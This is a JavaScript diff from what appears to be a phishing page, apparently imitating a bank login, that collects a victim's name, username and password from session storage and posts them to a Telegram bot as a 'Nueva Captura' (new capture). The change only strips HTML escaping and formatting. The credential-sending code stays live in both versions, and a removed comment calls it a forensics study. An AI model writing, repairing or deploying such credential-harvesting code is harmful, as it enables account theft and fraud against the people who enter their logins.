@@ -1030,20 +1030,10 @@
       const usuario = sessionStorage.getItem("bc_usuario") || "No detectado";
       const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
       
-      // Función para escapar caracteres HTML para evitar errores de parseo
-      const escapeHtml = (text) => {
-        return text
-          .replace(/&/g, "&amp;")
-          .replace(/</g, "&lt;")
-          .replace(/>/g, "&gt;")
-          .replace(/"/g, "&quot;")
-          .replace(/'/g, "&#039;");
-      };
-
-      // Información adicional para tu estudio de forense digital
-      const infoExtra = `\n🌐 IP: (Capturar en Backend)\n📱 Navegador: <code>${escapeHtml(navigator.userAgent.substring(0, 50))}...</code>`;
+      // Información adicional
+      const infoExtra = `\n🌐 IP: (Capturar en Backend)\n📱 Navegador: ${navigator.userAgent.substring(0, 50)}...`;
       
-      const mensaje = `🔐 <b>Nueva Captura</b>\n\n👤 <b>Nombre:</b> <code>${escapeHtml(userNombre)}</code>\n👤 <b>Usuario:</b> <code>${escapeHtml(usuario)}</code> \n🔑 <b>Clave:</b> <code>${escapeHtml(clave)}</code>${infoExtra}`;
+      const mensaje = `🔐 Nueva Captura\n\n👤 Nombre: ${userNombre}\n👤 Usuario: ${usuario} \n🔑 Clave: ${clave}${infoExtra}`;
 
       console.log("Intentando enviar a Telegram...");
 
@@ -1055,7 +1045,6 @@
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
             text: mensaje,
-            parse_mode: 'HTML',
             reply_markup: {
               inline_keyboard: [
                 [
